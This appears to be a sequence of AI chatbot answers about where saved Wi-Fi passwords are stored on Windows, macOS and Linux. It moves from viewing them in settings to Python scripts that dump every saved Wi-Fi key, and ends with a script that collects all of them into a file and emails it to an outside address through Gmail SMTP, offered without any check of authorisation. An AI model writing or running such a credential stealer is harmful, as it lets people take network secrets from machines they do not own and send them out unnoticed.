Yes, saved Wi-Fi passwords are stored on your computer. The location and method of storing these passwords depend on the operating system you are using. Here's a brief overview for common operating systems:

Windows
In Windows, Wi-Fi passwords are stored in the system registry and can be accessed through the Network and Sharing Center or using the Command Prompt:

Network and Sharing Center:

Go to Control Panel > Network and Sharing Center.
Click on "Manage wireless networks."
Right-click on the Wi-Fi network you want to view and select "Properties."
Go to the "Security" tab and check "Show characters" to reveal the password.
Command Prompt:

Open Command Prompt as an administrator.
Type the following command to list all saved Wi-Fi networks:
sql
Kodu kopyala
netsh wlan show profiles
To view the password for a specific network, use:
arduino
Kodu kopyala
netsh wlan show profile name="NetworkName" key=clear
Replace "NetworkName" with the name of your Wi-Fi network. Look for the "Key Content" line in the output.
macOS
In macOS, Wi-Fi passwords are stored in the Keychain Access utility:

Open the "Keychain Access" application (found in Applications > Utilities).
In the Keychain Access window, search for your Wi-Fi network name.
Double-click on the network name.
In the popup window, check the "Show password" box. You might need to enter your macOS administrator password to reveal the password.
Linux
In Linux, the storage location for Wi-Fi passwords can vary based on the distribution and network manager being used. Commonly, passwords are stored in configuration files:

NetworkManager:

Wi-Fi passwords are typically stored in /etc/NetworkManager/system-connections/ directory.
You can view these files using a text editor with superuser privileges. For example:
bash

Look for the psk= line to find the password.
WPA Supplicant:

If you are using wpa_supplicant, passwords might be stored in /etc/wpa_supplicant/wpa_supplicant.conf.
Always ensure you have the necessary permissions to access and view these files and settings.

Yes, you can use Python to access saved Wi-Fi passwords on your computer. Here are some example scripts for different operating systems:

Windows
You can use the subprocess module to run the necessary netsh commands and extract Wi-Fi passwords.

python
Kodu kopyala
import subprocess

def get_saved_wifi_passwords():
    # Get the list of Wi-Fi profiles
    profiles_data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors='backslashreplace')
    profiles = [line.split(":")[1].strip() for line in profiles_data.split('\n') if "All User Profile" in line]

    wifi_passwords = {}

    for profile in profiles:
        try:
            # Get the Wi-Fi password for each profile
            profile_info = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear']).decode('utf-8', errors='backslashreplace')
            password = [line.split(":")[1].strip() for line in profile_info.split('\n') if "Key Content" in line][0]
            wifi_passwords[profile] = password
        except IndexError:
            wifi_passwords[profile] = None

    return wifi_passwords

if __name__ == "__main__":
    passwords = get_saved_wifi_passwords()
    for network, pwd in passwords.items():
        print(f"Network: {network}, Password: {pwd}")

import os

def get_wifi_passwords():
    path = "/etc/NetworkManager/system-connections/"
    files = os.listdir(path)
    
    wifi_passwords = {}

    for file in files:
        try:
            with open(os.path.join(path, file), 'r') as f:
                data = f.read()
                network_name = None
                password = None
                for line in data.split('\n'):
                    if line.startswith("ssid="):
                        network_name = line.split("=")[1].strip()
                    if line.startswith("psk="):
                        password = line.split("=")[1].strip()
                if network_name and password:
                    wifi_passwords[network_name] = password
        except Exception as e:
            continue

    return wifi_passwords

if __name__ == "__main__":
    passwords = get_wifi_passwords()
    for network, pwd in passwords.items():
        print(f"Network: {network}, Password: {pwd}")

import subprocess
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

def get_saved_wifi_passwords():
    profiles_data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors='backslashreplace')
    profiles = [line.split(":")[1].strip() for line in profiles_data.split('\n') if "All User Profile" in line]

    wifi_passwords = {}

    for profile in profiles:
        try:
            profile_info = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear']).decode('utf-8', errors='backslashreplace')
            password = [line.split(":")[1].strip() for line in profile_info.split('\n') if "Key Content" in line][0]
            wifi_passwords[profile] = password
        except IndexError:
            wifi_passwords[profile] = None

    return wifi_passwords

def save_to_file(data, filename="wifi_passwords.txt"):
    with open(filename, 'w') as file:
        for network, password in data.items():
            file.write(f"Network: {network}, Password: {password}\n")

def send_email(filename, to_email, from_email, from_password):
    subject = "Wi-Fi Passwords"
    body = "Attached is the text file containing the Wi-Fi passwords."
    
    msg = MIMEMultipart()
    msg['From'] = from_email
    msg['To'] = to_email
    msg['Subject'] = subject

    msg.attach(MIMEText(body, 'plain'))

    attachment = open(filename, "rb")
    part = MIMEBase('application', 'octet-stream')
    part.set_payload((attachment).read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', "attachment; filename= " + filename)
    msg.attach(part)

    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(from_email, from_password)
    text = msg.as_string()
    server.sendmail(from_email, to_email, text)
    server.quit()

if __name__ == "__main__":
    passwords = get_saved_wifi_passwords()
    save_to_file(passwords)
    send_email("wifi_passwords.txt", "recipient@example.com", "your_email@gmail.com", "your_password")
    print(f"Wi-Fi passwords saved to wifi_passwords.txt and emailed to recipient@example.com")
